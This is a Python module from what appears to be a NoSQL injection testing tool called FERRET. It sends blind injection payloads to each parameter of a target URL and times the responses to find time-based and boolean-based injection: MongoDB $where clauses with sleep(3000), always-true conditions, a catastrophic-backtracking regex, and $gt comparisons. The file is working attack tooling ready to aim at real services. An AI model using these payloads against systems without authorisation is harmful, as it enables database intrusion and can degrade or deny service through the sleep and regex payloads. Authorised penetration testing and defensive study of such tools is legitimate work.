# ============================================================
#  FERRET - blind.py
#  Blind NoSQL injection detection using time delays
# ============================================================

import requests
import json
import time
from colorama import Fore, Style, init
init(autoreset=True)

GREEN  = Fore.GREEN
RED    = Fore.RED
YELLOW = Fore.YELLOW
CYAN   = Fore.CYAN
BOLD   = Style.BRIGHT
RESET  = Style.RESET_ALL

# Blind injection payloads using $where (causes delay)
BLIND_PAYLOADS = [
    # Time delay payloads using $where + sleep
    {"type": "where_sleep", "value": {"$where": "sleep(3000) || 1==1"}},
    {"type": "where_sleep", "value": {"$where": "function(){sleep(3000); return true;}"}},
    {"type": "where_true",  "value": {"$where": "1==1"}},
    {"type": "where_true",  "value": {"$where": "true"}},
    {"type": "regex_slow",  "value": {"$regex": "^(a+)+$"}},
    # Boolean based
    {"type": "bool_true",   "value": {"$gt": ""}},
    {"type": "bool_false",  "value": {"$gt": "zzzzzzzzzzzz"}},
]

class BlindDetector:
    def __init__(self, url, params=None, headers=None,
                 method="POST", timeout=15, delay_threshold=2.0):
        self.url             = url
        self.params          = params or {}
        self.headers         = headers or {"Content-Type": "application/json"}
        self.method          = method.upper()
        self.timeout         = timeout
        self.delay_threshold = delay_threshold
        self.findings        = []

    def _send_timed(self, data):
        """Send request and measure response time"""
        try:
            start = time.time()
            if self.method == "POST":
                resp = requests.post(
                    self.url,
                    json=data,
                    headers=self.headers,
                    timeout=self.timeout
                )
            else:
                resp = requests.get(
                    self.url,
                    params=data,
                    headers=self.headers,
                    timeout=self.timeout
                )
            elapsed = time.time() - start
            return resp, elapsed
        except requests.exceptions.Timeout:
            elapsed = time.time() - start
            print(f"{YELLOW}[TIMEOUT] Request timed out after {elapsed:.2f}s — possible blind injection!{RESET}")
            return None, elapsed
        except requests.exceptions.ConnectionError:
            print(f"{RED}[ERROR] Cannot connect to {self.url}{RESET}")
            return None, 0

    def _baseline_time(self):
        """Measure normal response time"""
        times = []
        print(f"{CYAN}[*] Measuring baseline response time...{RESET}")
        for _ in range(3):
            data = {k: "normalvalue123" for k in self.params}
            _, elapsed = self._send_timed(data)
            times.append(elapsed)
            time.sleep(0.5)
        avg = sum(times) / len(times)
        print(f"{YELLOW}[*] Baseline average: {avg:.2f}s{RESET}\n")
        return avg

    def run(self):
        print(f"\n{CYAN}{BOLD}[*] Starting blind injection detection on: {self.url}{RESET}")
        print(f"{CYAN}[*] Delay threshold: {self.delay_threshold}s{RESET}\n")

        baseline = self._baseline_time()

        for param in self.params:
            print(f"{BOLD}[*] Testing parameter: '{param}'{RESET}")

            true_times  = []
            false_times = []

            for payload in BLIND_PAYLOADS:
                data = dict(self.params)
                data[param] = payload["value"]

                resp, elapsed = self._send_timed(data)

                print(f"  [{payload['type']}] Time: {elapsed:.2f}s | Payload: {str(payload['value'])[:60]}")

                # Time based detection
                if elapsed > baseline + self.delay_threshold:
                    finding = {
                        "parameter": param,
                        "payload":   str(payload["value"]),
                        "type":      "time-based blind",
                        "delay":     f"{elapsed:.2f}s",
                        "baseline":  f"{baseline:.2f}s"
                    }
                    self.findings.append(finding)
                    print(f"  {GREEN}{BOLD}[BLIND INJECTION DETECTED!] Delay: {elapsed:.2f}s (baseline: {baseline:.2f}s){RESET}")

                # Boolean based — track true vs false response sizes
                if resp:
                    if payload["type"] in ["bool_true", "where_true"]:
                        true_times.append(len(resp.text))
                    elif payload["type"] == "bool_false":
                        false_times.append(len(resp.text))

            # Boolean based detection
            if true_times and false_times:
                avg_true  = sum(true_times) / len(true_times)
                avg_false = sum(false_times) / len(false_times)

                if abs(avg_true - avg_false) > 50:
                    finding = {
                        "parameter":    param,
                        "type":         "boolean-based blind",
                        "true_length":  avg_true,
                        "false_length": avg_false,
                        "difference":   abs(avg_true - avg_false)
                    }
                    self.findings.append(finding)
                    print(f"\n  {GREEN}{BOLD}[BOOLEAN BLIND DETECTED!] True response: {avg_true:.0f}b | False response: {avg_false:.0f}b{RESET}")

        print(f"\n{CYAN}[*] Blind detection complete. {len(self.findings)} finding(s).{RESET}\n")
        return self.findings